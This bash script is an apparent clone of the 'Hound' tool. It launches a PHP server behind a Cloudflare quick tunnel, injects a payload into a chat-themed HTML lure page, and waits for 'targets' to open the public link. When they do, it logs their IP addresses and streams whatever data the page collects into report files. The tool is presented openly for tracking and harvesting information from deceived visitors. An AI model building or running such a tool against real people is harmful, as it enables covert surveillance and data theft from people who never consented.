#!/bin/bash
# Tools v0.3
# Powered by MohamedLaDz
# Visit https://t.me/MohamedLa122

trap 'printf "\n";stop' 2

banner() {
clear
printf '\n'
printf '\e[1;34m'
printf '                   ▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒\n'
printf '                   ▒▒█▒▒▒▄██████████▄▒▒▒▒\n'
printf '                   ▒█▐▒▒▒████████████▒▒▒▒\n'
printf '                   ▒▌▐▒▒██▄▀██████▀▄██▒▒▒\n'
printf '                   ▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒\n'
printf '                   ▐┼▐▒▒██████████████▒▒▒\n'
printf '                   ▐▄▐████─▀▐▐▀█─█─▌▐██▄▒\n'
printf '                   ▒▒█████──────────▐███▌\n'
printf '                   ▒▒█▀▀██▄█─▄───▐─▄███▀▒\n'
printf '                   ▒▒█▒▒███████▄██████▒▒▒\n'
printf '                   ▒▒▒▒▒██████████████▒▒▒\n'
printf '                   ▒▒▒▒▒█████████▐▌██▌▒▒▒\n'
printf '                   ▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒\n'
printf '                   ▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒\n'
printf '\e[0m'
printf '\e[1;92mFind Ver 0.3 - by MohamedLaDz\e[0m \n'
printf '\e[1;96mTelegram: https://t.me/MohamedLa122\e[0m \n'
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "\e[1;31mError: PHP is not installed. Please install PHP.\e[0m"; exit 1; } 
}

stop() {
checkcf=$(pgrep -f "cloudflared")
checkphp=$(pgrep -f "php")
checkssh=$(pgrep -f "ssh")
if [[ -n $checkcf ]]; then
pkill -f cloudflared
fi
if [[ -n $checkphp ]]; then
pkill -f php
fi
if [[ -n $checkssh ]]; then
pkill -f ssh
fi
printf '\e[1;33m[INFO] Stopped all relevant services.\e[0m\n'
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | awk '{print $2}')
IFS=$'\n'
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\n\e[1;90mPress Ctrl + C to exit\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\e[0m\n"
catch_ip
rm -f ip.txt
tail -f -n 110 data.txt
fi
sleep 0.5
done 
}

cf_server() {
if [[ -e cloudflared ]]; then
printf "\e[1;93m[INFO] Cloudflared is already installed.\e[0m\n"
else
command -v wget > /dev/null 2>&1 || { echo >&2 "\e[1;31mError: wget is not installed. Please install wget.\e[0m"; exit 1; }
printf "\e[1;92m[INFO] Downloading Cloudflared...\e[0m\n"
arch=$(uname -m)
if [[ $arch == *'arm'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
elif [[ "$arch" == *'aarch64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
elif [[ "$arch" == *'x86_64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
else
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
fi
fi
chmod +x cloudflared
printf "\e[1;92m[INFO] Starting PHP server...\e[0m\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[INFO] Starting Cloudflared tunnel...\e[0m\n"
rm -f cf.log
./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
if [[ -z "$link" ]]; then
printf "\e[1;31m[ERROR] Direct link is not generating.\e[0m\n"
exit 1
else
printf "\e[1;92m[INFO] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[INFO] Starting PHP server on Localhost:8080...\e[0m\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
sleep 2
checkfound
}

hound() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -f data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -f ip.txt
fi
sed -e '/tc_payload/r payload' index_chat.html > index.html
default_option_server="Y"
read -p $'\n\e[1;93mDo you want to use Cloudflared tunnel?\n\e[1;92mOtherwise, it will run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
cf_server
else
local_server
fi
}

banner
dependencies
hound
